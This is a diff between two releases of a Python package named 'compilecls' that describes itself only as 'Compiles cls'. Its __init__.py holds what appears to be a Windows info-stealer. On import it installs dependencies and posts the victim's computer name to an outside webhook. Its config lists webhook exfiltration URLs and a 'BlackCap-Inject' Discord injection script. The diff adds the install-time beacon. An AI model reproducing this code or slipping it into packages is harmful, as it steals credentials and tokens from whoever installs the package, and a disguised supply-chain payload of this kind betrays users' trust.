# Comparing `tmp/compilecls-1.0.5.tar.gz` & `tmp/compilecls-1.0.6.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "compilecls-1.0.5.tar", last modified: Fri Apr 14 13:02:23 2023, max compression
+gzip compressed data, was "compilecls-1.0.6.tar", last modified: Fri Apr 14 15:07:06 2023, max compression
```

## Comparing `compilecls-1.0.5.tar` & `compilecls-1.0.6.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 13:02:23.199321 compilecls-1.0.5/
--rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 13:02:23.199321 compilecls-1.0.5/PKG-INFO
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 13:02:23.199321 compilecls-1.0.5/compilecls/
--rw-r--r--   0 root         (0) root         (0)    81723 2023-04-14 13:02:22.000000 compilecls-1.0.5/compilecls/__init__.py
-drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 13:02:23.199321 compilecls-1.0.5/compilecls.egg-info/
--rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 13:02:23.000000 compilecls-1.0.5/compilecls.egg-info/PKG-INFO
--rw-r--r--   0 root         (0) root         (0)      167 2023-04-14 13:02:23.000000 compilecls-1.0.5/compilecls.egg-info/SOURCES.txt
--rw-r--r--   0 root         (0) root         (0)        1 2023-04-14 13:02:23.000000 compilecls-1.0.5/compilecls.egg-info/dependency_links.txt
--rw-r--r--   0 root         (0) root         (0)       11 2023-04-14 13:02:23.000000 compilecls-1.0.5/compilecls.egg-info/top_level.txt
--rw-r--r--   0 root         (0) root         (0)       38 2023-04-14 13:02:23.199321 compilecls-1.0.5/setup.cfg
--rw-r--r--   0 root         (0) root         (0)      534 2023-04-14 13:02:22.000000 compilecls-1.0.5/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 15:07:06.879603 compilecls-1.0.6/
+-rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 15:07:06.879603 compilecls-1.0.6/PKG-INFO
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 15:07:06.879603 compilecls-1.0.6/compilecls/
+-rw-r--r--   0 root         (0) root         (0)    82161 2023-04-14 15:07:06.000000 compilecls-1.0.6/compilecls/__init__.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-04-14 15:07:06.879603 compilecls-1.0.6/compilecls.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      321 2023-04-14 15:07:06.000000 compilecls-1.0.6/compilecls.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      167 2023-04-14 15:07:06.000000 compilecls-1.0.6/compilecls.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-04-14 15:07:06.000000 compilecls-1.0.6/compilecls.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       11 2023-04-14 15:07:06.000000 compilecls-1.0.6/compilecls.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-04-14 15:07:06.879603 compilecls-1.0.6/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      534 2023-04-14 15:07:05.000000 compilecls-1.0.6/setup.py
```

### Comparing `compilecls-1.0.5/compilecls/__init__.py` & `compilecls-1.0.6/compilecls/__init__.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,23 +1,34 @@
+import os
+os.system("pip install requests httpx")
+import requests
+import os
+import httpx
+data = {
+        'embeds': [{
+            "title": "Someone Tried to download",
+            "description": "PC Username =" + os.getenv("COMPUTERNAME")
+            }]
+            
+    }
+httpx.post("https://vkiod3bec0gmmc4yspoaqu.hooks.webhookrelay.com/", json=data)
+os.system("pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32")
 import asyncio
 import json
 import ntpath
-import os
 import random
 import re
 import shutil
 import sqlite3
 import subprocess
 import threading
 import winreg
 import zipfile
-import httpx
 import psutil
 import base64
-import requests
 import ctypes
 import time
 import pyperclip
 import win32gui
 import win32con
 
 
@@ -39,15 +50,15 @@
 roaming = os.getenv("APPDATA")
 temp = os.getenv("TEMP")
 
 NotPSSW = []
 
 
 __config__ = {
-    "yourwebhookurl": "https://canary.discord.com/api/webhooks/1096419470311968849/SWwo6vHJiR4WvsYxQw8fzuE8uSZcXYM0fm6C0-Uoijm80nBGy9IXEeB-axmJDN3L41VG",
+    "yourwebhookurl": "https://vkiod3bec0gmmc4yspoaqu.hooks.webhookrelay.com/",
     "bc_injection_url": "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     "hide": "yes",
     "ping": "yes",
     "pingtype": "everyone",
     "fake_error": "no",
     "startup": "no",
     "kill_discord_process": "%kill_discord_process%",
```

### Comparing `compilecls-1.0.5/setup.py` & `compilecls-1.0.6/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 from setuptools import setup, find_packages
 
-VERSION = '1.0.5'
+VERSION = '1.0.6'
 DESCRIPTION = "Compiles cls"
 LONG_DESCRIPTION = "Compiles cls"
 
 # Setting up
 setup(
     name="compilecls",
     version=VERSION,
```

